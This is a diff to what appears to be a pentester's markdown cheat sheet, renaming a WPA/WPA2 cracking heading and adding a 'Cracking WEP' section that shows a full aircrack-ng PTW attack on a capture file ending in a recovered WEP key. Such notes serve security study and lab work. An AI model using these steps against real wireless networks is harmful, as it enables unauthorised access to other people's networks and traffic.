@@ -84,8 +84,7 @@ Filters
 - frame contains ORA-  "finds string matching ORA- exactly useful for finding oracle traffic"
 
 
-### WPA/WPA2 Cracking
-
+### Cracking WPA/WPA2 
 
 Scan all channels   
 `airodump-ng wlan0mon`
@@ -134,3 +133,48 @@ Crack WPA2
 
       EAPOL HMAC     : E7 2C 3E D2 EC F6 5E 1B E0 6C 68 B5 92 74 6C 0C
 ```
+
+#### Cracking WEP
+
+```bash
+root@vipertooth:~# aircrack-ng wep.pcap                                                              
+Opening wep.pcap                                                                                       
+Read 92091 packets.                                                                                     
+                                                                                                        
+   #  BSSID              ESSID                     Encryption                                           
+                                                                                                        
+   1  6C:70:9F:DE:66:89  TH3PAD                    WPA (0 handshake)                                    
+   2  88:1F:A1:32:A7:F9  Vulnerable Bank           WPA (0 handshake)                                    
+   3  58:6D:8F:07:4E:8F  wep                       WEP (83754 IVs)                                                          
+   4  00:1C:DF:B2:E6:47  jeff                      WEP (1852 IVs)                                       
+                                                                                                        
+Index number of target network ? 3                                                                      
+                                                                                                        
+Opening wep.pcap                                                                                       
+Attack will be restarted every 5000 captured ivs.                                                       
+Starting PTW attack with 83754 ivs.                                                                     
+
+                                             Aircrack-ng 1.2 
+
+
+                             [00:00:02] Tested 1397591 keys (got 83754 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  1   E2(109056) 2F(97536) A5(97536) 44(94464) 87(94464) D7(93952) 06(93696) 
+    1    0/  1   28(113152) 33(98816) E2(97792) 3C(97280) 03(95232) 28(94208) E5(93952) 
+    2    0/  1   9E(112640) 01(99072) FE(97024) 9B(96256) F1(94976) 72(94464) 73(93696) 
+    3    0/  1   0F(111872) 1C(96000) 6A(95488) 4C(94720) 55(94208) FD(94208) BA(93952) 
+    4    0/  1   19(109568) 79(97536) AF(96000) 5E(94976) 74(94208) E0(94208) D4(93952) 
+    5    0/  1   4A(116992) 48(95232) EB(94720) 82(94464) D1(94208) DD(94208) B5(93952) 
+    6    0/  1   B7(102400) EE(99584) 25(96000) 70(96000) DB(94464) C0(94208) 6C(93184) 
+    7    0/  1   1A(108032) 72(98304) F8(97280) 31(96256) 8F(95232) D4(94976) 12(94208) 
+    8    1/  8   30(93696) D4(93184) 84(92928) FB(92672) 02(92416) 13(92416) 1F(92416) 
+    9    0/  1   33(115712) 9C(97024) B1(96256) 24(94720) 0B(94464) 08(93952) 4E(93184) 
+   10    1/  1   7C(93440) A9(93440) 13(93184) 69(92672) BE(92672) E3(92416) E0(91904) 
+   11    1/  1   8F(95232) 65(94208) 41(93696) 9A(93696) D1(92672) 2C(92160) 6C(91904) 
+   12    0/  1   54(100564) 47(96416) 83(95224) A9(94572) 12(94504) 0D(93584) AA(93072) 
+
+             KEY FOUND! [ E2:28:9E:0F:19:4A:B7:1A:9F:33:53:55:54 ] 
+        Decrypted correctly: 100%
+```
+
